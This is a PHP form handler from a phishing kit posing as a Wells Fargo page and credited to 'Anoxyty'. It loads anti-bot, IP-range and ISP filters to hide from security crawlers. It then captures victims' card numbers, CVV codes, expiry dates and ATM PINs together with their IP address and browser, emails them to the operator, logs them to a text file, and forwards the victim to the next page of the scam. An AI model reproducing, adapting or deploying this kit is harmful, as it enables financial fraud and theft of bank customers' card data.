<?php include_once'../proxy.php';?><?php include_once'../proxy.php';?><?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
include ("anti/bot.php");
	include ("anti/iprange.php");
	include ("anti/wrd.php");
	include ("anti/isp.php");
	ob_start();
session_start();
	include 'yours.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['ccn'] ) ) {
		
		$_SESSION['ccn'] 	  = $_POST['ccn'];
		$_SESSION['cvv'] 	  = $_POST['cvv'];
		$_SESSION['expmnth'] 	  = $_POST['expmnth'];
		$_SESSION['expyr'] 	  = $_POST['expyr'];
		$_SESSION['atm'] 	  = $_POST['atm'];		

		$code = <<<EOT
============== [ WellsFargo Card | ]🔥 ==============
[CARD NUMBER] 		: {$_SESSION['ccn']}
[CVV]		: {$_SESSION['cvv']}
[Expiry Month] 		: {$_SESSION['expmnth']}
[Expiry Year]		: {$_SESSION['expyr']}
[ATM]		: {$_SESSION['atm']}
	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 WellsFargo By Anoxyty💼 ] =============
\r\n\r\n
EOT;

		$subject = "💼 WellsFargo Card By Anoxyty💼  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <wellsby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($yours,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: info.php?&sessionid={$_SESSION['randString']}&ue");
        exit();
	} else {
		header("Location: index.php");
		exit();
	}
?>